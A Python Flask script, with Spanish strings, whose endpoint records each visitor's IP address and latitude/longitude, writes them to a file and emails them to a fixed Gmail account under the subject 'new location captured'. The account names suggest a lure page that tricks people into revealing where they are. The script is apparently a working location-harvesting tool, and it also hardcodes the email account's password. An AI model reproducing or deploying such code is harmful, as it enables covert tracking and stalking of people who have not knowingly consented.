from flask import Flask, request, render_template
from datetime import datetime
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

EMAIL_ORIGEN = "revisatuubicacino@gmail.com"
EMAIL_DESTINO = "revisatuubicacion@gmail.com"
EMAIL_PASSWORD = "Ubicacion2025"

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/guardar', methods=['GET'])
def guardar():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    mensaje = f"""
    📅 Fecha: {fecha}
    🌐 IP: {ip}
    📍 Latitud: {lat}
    📍 Longitud: {lon}
    """

    # Guardar en archivo
    with open('ubicaciones.txt', 'a') as f:
        f.write(mensaje + '\n')

    # Enviar correo
    try:
        msg = MIMEText(mensaje)
        msg['Subject'] = f"Nueva ubicación capturada ({ip})"
        msg['From'] = EMAIL_ORIGEN
        msg['To'] = EMAIL_DESTINO

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_ORIGEN, EMAIL_PASSWORD)
            server.send_message(msg)

        print("Correo enviado con éxito.")
    except Exception as e:
        print(f"Error al enviar correo: {e}")

    return 'Ubicación recibida. ¡Gracias!'
